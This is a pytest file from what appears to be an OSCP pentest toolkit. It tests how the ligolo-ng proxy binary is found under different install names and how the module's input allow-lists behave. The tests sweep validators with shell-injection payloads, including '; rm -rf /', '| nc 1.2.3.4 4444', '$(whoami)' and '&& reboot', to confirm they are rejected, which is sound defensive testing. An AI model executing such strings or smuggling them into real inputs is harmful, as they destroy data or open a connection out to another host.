"""ligolo-pivot: proxy-binary resolution and input allow-lists.

The bug that prompted this file: `up` assumed the proxy was on $PATH as `proxy`,
but Exegol ships it as `ligolo-ng` (/opt/tools/bin/ligolo-ng), so `up` died on a
working install. resolve_proxy_bin() now auto-detects across the names the binary
actually goes by. These tests fake $PATH via shutil.which so they run anywhere.
"""

import pytest

from oscp_toolkit import ligolo_pivot as lp
from oscp_toolkit._common.validate import ValidationError

# Same payload set the rest of the suite sweeps every validator with.
PAYLOADS = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "&& reboot",
    "| nc 1.2.3.4 4444",
    "\nreboot",
]


def _fake_which(present):
    """Return a which() that resolves only the names in `present` (name -> /usr/bin/name)."""
    return lambda n: f"/usr/bin/{n}" if n in present else None


# --- auto-detect (--proxy-bin omitted) -----------------------------------------------------------
def test_autodetect_prefers_upstream_proxy_name(monkeypatch):
    monkeypatch.setattr(lp.shutil, "which", _fake_which({"proxy", "ligolo-ng"}))
    assert lp.resolve_proxy_bin(None) == "/usr/bin/proxy"


def test_autodetect_finds_exegol_ligolo_ng(monkeypatch):
    """The actual Exegol case: no `proxy`, but `ligolo-ng` is on $PATH."""
    monkeypatch.setattr(lp.shutil, "which", _fake_which({"ligolo-ng"}))
    assert lp.resolve_proxy_bin(None) == "/usr/bin/ligolo-ng"


def test_autodetect_finds_kali_ligolo_proxy(monkeypatch):
    monkeypatch.setattr(lp.shutil, "which", _fake_which({"ligolo-proxy"}))
    assert lp.resolve_proxy_bin(None) == "/usr/bin/ligolo-proxy"


def test_autodetect_dies_when_no_candidate_present(monkeypatch):
    monkeypatch.setattr(lp.shutil, "which", _fake_which(set()))
    with pytest.raises(ValidationError):
        lp.resolve_proxy_bin(None)


def test_candidate_order_is_stable():
    # order matters: upstream `proxy` first, then Exegol, then Kali.
    assert lp.PROXY_BIN_CANDIDATES == ("proxy", "ligolo-ng", "ligolo-proxy")


# --- explicit --proxy-bin ------------------------------------------------------------------------
def test_explicit_name_is_honoured_over_autodetect(monkeypatch):
    monkeypatch.setattr(lp.shutil, "which", _fake_which({"proxy", "ligolo-ng"}))
    # asking for ligolo-ng returns ligolo-ng even though `proxy` also resolves
    assert lp.resolve_proxy_bin("ligolo-ng") == "/usr/bin/ligolo-ng"


def test_explicit_missing_name_dies(monkeypatch):
    monkeypatch.setattr(lp.shutil, "which", _fake_which(set()))
    with pytest.raises(ValidationError):
        lp.resolve_proxy_bin("proxy")


def test_explicit_path_must_exist_and_be_executable(tmp_path):
    f = tmp_path / "proxy"
    f.write_text("#!/bin/sh\n")
    # not executable yet -> refused
    with pytest.raises(ValidationError):
        lp.resolve_proxy_bin(str(f))
    f.chmod(0o755)
    assert lp.resolve_proxy_bin(str(f)) == str(f)


def test_explicit_nonexistent_path_dies(tmp_path):
    with pytest.raises(ValidationError):
        lp.resolve_proxy_bin(str(tmp_path / "nope"))


# --- injection: the allow-list rejects, never sanitizes -----------------------------------------
@pytest.mark.parametrize("payload", PAYLOADS)
def test_proxy_bin_rejects_shell_metacharacters(payload):
    with pytest.raises(ValidationError):
        lp.resolve_proxy_bin(f"proxy{payload}")


@pytest.mark.parametrize("payload", PAYLOADS)
def test_proxy_arg_rejects_shell_metacharacters(payload):
    with pytest.raises(ValidationError):
        lp.valid_proxy_args([f"-laddr{payload}"])


def test_proxy_args_accepts_legitimate_tokens():
    good = ["-selfcert", "-laddr", "0.0.0.0:11601", "--allow-all=1"]
    assert lp.valid_proxy_args(good) == good


# --- the other input gates (quick sanity, they route through shared validators) ------------------
def test_subnet_bare_host_becomes_slash32():
    assert lp.valid_subnet("10.1.182.100") == "10.1.182.100/32"
    assert lp.valid_subnet("10.1.182.0/24") == "10.1.182.0/24"


def test_subnet_rejects_junk():
    for bad in ["not-an-ip", "10.1.182.100; reboot", "$(id)"]:
        with pytest.raises(ValidationError):
            lp.valid_subnet(bad)


def test_laddr_builds_host_colon_port():
    assert lp.valid_laddr("0.0.0.0", 11601) == "0.0.0.0:11601"
    for bad_host in ["notanip", "1.2.3.4; rm"]:
        with pytest.raises(ValidationError):
            lp.valid_laddr(bad_host, 11601)
    for bad_port in [0, 65536, -1]:
        with pytest.raises(ValidationError):
            lp.valid_laddr("0.0.0.0", bad_port)


def test_user_and_iface_gates():
    assert lp.valid_user("root") == "root"
    assert lp.valid_iface("ligolo") == "ligolo"
    for bad in ["root; rm", "$(whoami)"]:
        with pytest.raises(ValidationError):
            lp.valid_user(bad)
        with pytest.raises(ValidationError):
            lp.valid_iface(bad)
